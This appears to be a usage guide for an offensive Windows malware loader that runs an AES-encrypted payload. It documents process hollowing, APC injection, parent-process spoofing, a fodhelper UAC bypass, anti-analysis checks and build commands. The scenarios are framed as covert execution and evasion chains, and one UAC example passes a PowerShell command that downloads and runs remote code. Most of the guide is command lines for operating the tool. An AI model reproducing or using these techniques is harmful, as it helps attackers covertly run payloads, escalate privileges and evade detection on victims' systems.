# AES Loader - Complete Usage Guide

## Overview

The AES Loader supports 4 operational modes:

1. **DEFAULT** - Spawn svchost.exe + APC injection (no mode flag required)
2. **HOLLOW** - Process hollowing (create new process and replace code)
3. **APC** - Async Procedure Call injection into existing process
4. **UAC** - UAC bypass via fodhelper exploit

---

## DEFAULT MODE: Spawn svchost + APC Inject

### Basic Usage
```bash
./loader.exe
```
**Behavior:**
- Spawns svchost.exe process suspended
- APC injects encrypted payload into spawned process
- Simple and stealthy, no flags needed

### With Verbose Output
```bash
./loader.exe -v
```
**Behavior:**
- Same as above but with detailed debug logging
- Shows cipher initialization, payload detection, section writes, etc.

### With PPID Spoofing
```bash
./loader.exe --ppid 1152 -v
```
**Behavior:**
- Spawns svchost.exe with spoofed parent process (PPID: 1152)
- APC injects payload
- Parent process will appear as the spoofed PID in Process Explorer
- Requires: Target parent process must exist and be accessible

### With Anti-Analysis
```bash
./loader.exe -a -v
```
**Behavior:**
- Runs anti-analysis checks (VM detection, timing verification)
- Spawns svchost.exe + APC inject + verbose logging

---

## HOLLOW MODE: Process Hollowing

### Hollow Default Process (svchost.exe)
```bash
./loader.exe -m hollow -v
```
**Behavior:**
- Creates suspended svchost.exe process
- Parses encrypted PE payload
- Allocates memory in target process
- Writes PE headers and all sections
- Fixes relocation table
- Updates PEB ImageBase
- Sets thread entry point (RCX register)
- Resumes process execution

### Hollow Custom Process
```bash
./loader.exe -m hollow -f notepad.exe -v
```
**Behavior:**
- Hollow notepad.exe instead of svchost.exe
- Full PE injection with proper initialization
- Useful for spoofing program execution

### Hollow with PPID Spoofing
```bash
./loader.exe -m hollow -f explorer.exe --ppid 500 -v
```
**Behavior:**
- Hollow explorer.exe process
- Parent process spoofed to PID 500
- Process tree will show custom parent relationship
- Advanced evasion technique

---

## APC MODE: Existing Process Injection

### APC into Specific Process
```bash
./loader.exe -m apc -p 1464 -v
```
**Behavior:**
- Opens existing process with PID 1464
- Allocates memory in target process
- Detects payload type (PE or shellcode)
- If PE: Maps all sections + fixes relocations
- If shellcode: Direct allocation + CreateRemoteThread
- Thread execution via APC queue

### Important Requirements
- `-p PID` is **required** for APC mode
- Target process must be accessible
- Must have sufficient privileges

---

## UAC MODE: Privilege Escalation

### UAC Bypass (Re-execute Payload)
```bash
./loader.exe -m uac -v
```
**Behavior:**
1. Injects into fodhelper.exe (UAC bypass)
2. Reconstructs loader command WITHOUT -m uac flag
3. Spawns new svchost + APC injects (elevated)
4. Original process exits

### UAC Bypass with Custom Command
```bash
./loader.exe -m uac -c "powershell.exe -c 'IEX(New-Object Net.WebClient).DownloadString(...)'"
```
**Behavior:**
1. Injects into fodhelper.exe
2. Stores custom command in registry
3. Command executes elevated instead of re-running loader
4. Flexible payload execution

### Re-execute in APC Mode (Elevated)
```bash
./loader.exe -m uac -c "C:\path\loader.exe -m apc -p 1464"
```
**Behavior:**
1. UAC escalation via fodhelper
2. Executes loader in APC mode with elevated privileges
3. Useful for injecting into system processes

---

## COMPLETE COMMAND EXAMPLES

### Scenario 1: Covert Default Execution
```bash
./loader.exe -v
```
→ Spawn hidden svchost + APC inject + debug output

### Scenario 2: Parent Process Spoofing
```bash
./loader.exe --ppid 4 -v
```
→ Spawn svchost as child of System (PID 4)

### Scenario 3: Explorer Hollowing
```bash
./loader.exe -m hollow -f explorer.exe --ppid 500 -v
```
→ Hollow explorer + spoof parent + verbose

### Scenario 4: Inject into Running Process
```bash
./loader.exe -m apc -p 8692 -v
```
→ APC inject into existing explorer.exe (PID 8692)

### Scenario 5: UAC Bypass with Custom Command
```bash
./loader.exe -m uac -c "cmd.exe /c calc.exe" -v
```
→ UAC → fodhelper → launch calc elevated

### Scenario 6: Complete Evasion Chain
```bash
./loader.exe -m hollow -f svchost.exe --ppid 500 -a -v
```
→ Hollow svchost + PPID spoof + anti-analysis + verbose

---

## FLAG REFERENCE

| Flag | Argument | Description |
|------|----------|-------------|
| `-m, --mode` | hollow/apc/uac | Injection mode (default: spawn+apc) |
| `-v, --verbose` | none | Enable debug output |
| `-a, --anti` | none | Run anti-analysis checks |
| `-f, --file` | PATH | Target process (default: svchost.exe) |
| `-p, --pid` | PID | Target PID for APC (required for -m apc) |
| `--ppid` | PID | Parent PID spoofing |
| `-c, --cmd` | COMMAND | Custom command for UAC mode |
| `-h, --help` | none | Show help |

---

## PAYLOAD DETECTION

The loader automatically detects payload type:

- **PE Payload** (DOS + PE signatures):
  - Full PE header parsing
  - Section allocation and mapping
  - Relocation table fixing
  - PEB ImageBase update

- **Raw Shellcode**:
  - Simple memory allocation
  - WriteProcessMemory
  - CreateRemoteThread execution

---

## ERROR HANDLING

### Missing Requirements
```
[-] Mode APC requires -p/--pid
```
→ Always use `-p PID` with `-m apc`

### Process Access
```
[-] OpenProcess failed: error 5
```
→ Insufficient privileges for target process

### Invalid Mode
```
[-] Unknown mode: xyz (use: hollow, apc, uac)
```
→ Use hollow, apc, or uac only

---

## PRIVILEGE REQUIREMENTS

| Mode | Requirements |
|------|--------------|
| DEFAULT | User privileges OK |
| HOLLOW | User privileges OK |
| APC | User privileges (existing process) |
| UAC | User privileges (escalates to admin) |
| PPID Spoofing | Admin privileges required |

---

## ANTI-DETECTION FEATURES

1. **Payload Encryption**: AES-256-CBC with random seed
2. **PE Parsing**: Proper relocation fixing prevents crashes
3. **PPID Spoofing**: Hide parent process relationship
4. **Custom Targets**: Use any process, not just svchost
5. **UAC Bypass**: Elevate privileges without UAC prompt
6. **Anti-Analysis**: VM detection + timing checks

---

## COMPILATION

### MSVC (Visual Studio)
```bash
cl /std:c++17 /EHsc loader.cpp process_hollower.cpp process_injection.cpp \
   bypass_analysis.cpp uac_bypass.cpp crypto_funcs.cpp easCipher42.cpp \
   /link kernel32.lib ntdll.lib
```

### MinGW
```bash
g++ -std=c++17 -o loader.exe loader.cpp process_hollower.cpp \
    process_injection.cpp bypass_analysis.cpp uac_bypass.cpp \
    crypto_funcs.cpp easCipher42.cpp -lkernel32 -lntdll
```

---

## TROUBLESHOOTING

**Process doesn't execute:**
- Check payload format (PE vs shellcode signature)
- Verify process permissions
- Try with `-v` to see debug output

**PPID spoofing fails:**
- Parent process must exist
- Need admin privileges
- Check target PID validity

**UAC bypass fails:**
- Requires standard user (not admin already)
- fodhelper.exe must be available (Windows 10+)
- Check registry permissions

**Relocation errors:**
- Ensure PE was built position-independent
- Check ASLR compatibility
- Try different target memory addresses
